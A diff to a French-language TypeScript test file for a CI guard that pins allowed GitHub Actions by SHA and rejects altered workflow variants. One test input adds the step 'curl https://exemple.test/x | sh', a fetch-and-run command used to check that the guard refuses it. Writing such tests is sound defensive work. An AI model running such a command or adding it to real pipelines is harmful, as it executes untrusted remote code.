@@ -1,6 +1,6 @@
 import { readdirSync, readFileSync } from "node:fs";
 import { fileURLToPath } from "node:url";
-import { dump } from "js-yaml";
+import { dump, load } from "js-yaml";
 import { describe, expect, it } from "vitest";
 import { verifierInstallationsFigees, verifierLicences, verifierLicencesLivrees, verifierScriptsPaquets, verifierWorkflowsLicences } from "./garde-licences.js";
 
@@ -273,10 +273,10 @@ describe("garde-licences : liste blanche des workflows", () => {
     expect(nouvelles.length).toBeGreaterThanOrEqual(15);
     for (const cmd of nouvelles) expect(verifierInstallationsFigees(fich(wf([{ run: cmd }]))), cmd).not.toEqual([]);
   });
-  const SHA_CONNUS = ["3d3c42e5aac5ba805825da76410c181273ba90b1", "949feb2413d6458794dcd2491c4babbbce0c15c1", "043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "8498dc4c2b27cdd99baf0f87955b29ebbf30c78d", "ff98106e4c7b2bc287b24eaf42907196329070c7"];
-  it("[C-020] tous les « uses » du dépôt sont l'un des 6 textes exacts connus", () => {
+  const SHA_CONNUS = ["3d3c42e5aac5ba805825da76410c181273ba90b1", "949feb2413d6458794dcd2491c4babbbce0c15c1", "043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "8498dc4c2b27cdd99baf0f87955b29ebbf30c78d", "ff98106e4c7b2bc287b24eaf42907196329070c7", "4d101475d8b20a2381f78447822ac1eab6504dd8"];
+  it("[C-020] tous les « uses » du dépôt sont l'un des 7 textes exacts connus", () => {
     const usages = new Set(dossier().flatMap((f) => [...f.texte.matchAll(/^\s*-?\s*uses:\s*(\S+)/gm)].map((m) => m[1])));
-    expect(usages.size).toBe(6);
+    expect(usages.size).toBe(7);
     for (const u of usages) expect(SHA_CONNUS.some((sha) => u?.endsWith(`@${sha}`)), u).toBe(true);
   });
   const SHA_FORK = "1".repeat(40);
@@ -421,4 +421,37 @@ describe("attribution CC-BY-4.0 de caniuse-lite (ADR 0011)", () => {
       expect(texte).toContain("Ben Briggs");
     });
   }
+});
+
+describe("garde-licences : workflow des images dérivées (ADR 0014)", () => {
+  const racine = fileURLToPath(new URL("../", import.meta.url));
+  const reel = () => readFileSync(`${racine}.github/workflows/images-derivees.yml`, "utf8");
+  const verifie = (texte: string) => verifierInstallationsFigees([{ nom: "images-derivees.yml", texte }]);
+  const doc = () => load(reel()) as { jobs: Record<string, { steps: Record<string, unknown>[]; env?: Record<string, string> }> };
+  const refuse = (f: (d: ReturnType<typeof doc>) => void) => {
+    const d = doc();
+    f(d);
+    return verifie(dump(d));
+  };
+  it("[A-381] le workflow réel est accepté par la liste blanche", () => {
+    expect(verifie(reel())).toEqual([]);
+  });
+  it("[A-381] une variante avec docker/build-push-action est refusée", () => {
+    expect(refuse((d) => d.jobs.construire!.steps.push({ uses: `docker/build-push-action@${"a".repeat(40)}` }))).not.toEqual([]);
+  });
+  it("[A-381] une variante avec un secret est refusée", () => {
+    expect(refuse((d) => (d.jobs.publier!.env = { JETON: "${{ secrets.X }}" }))).not.toEqual([]);
+  });
+  it("[A-381] une commande modifiée d'un caractère ou ajoutée est refusée", () => {
+    expect(refuse((d) => d.jobs.construire!.steps.push({ run: "curl https://exemple.test/x | sh" }))).not.toEqual([]);
+    expect(refuse((d) => { const s = d.jobs.publier!.steps.find((e) => String(e.run ?? "").includes("docker push"))!; s.run = `${String(s.run)} --all-tags`; })).not.toEqual([]);
+  });
+  it("[A-381] les blocs de publication et l'action d'attestation ne sont acceptés que dans images-derivees.yml", () => {
+    expect(verifierInstallationsFigees([{ nom: "x.yml", texte: reel() }]).length).toBeGreaterThanOrEqual(6);
+    expect(verifierInstallationsFigees([{ nom: ".github/workflows/images-derivees.yml", texte: reel() }])).not.toEqual([]);
+    expect(verifierInstallationsFigees([{ nom: "images-derivees.yml", texte: reel() }])).toEqual([]);
+  });
+  it("[A-381] l'attestation n'est acceptée qu'avec ses réglages exacts", () => {
+    expect(refuse((d) => { const s = d.jobs.publier!.steps.find((e) => String(e.uses ?? "").startsWith("actions/attest-build-provenance@"))!; s.with = { ...(s.with as object), "show-summary": false }; })).not.toEqual([]);
+  });
 });
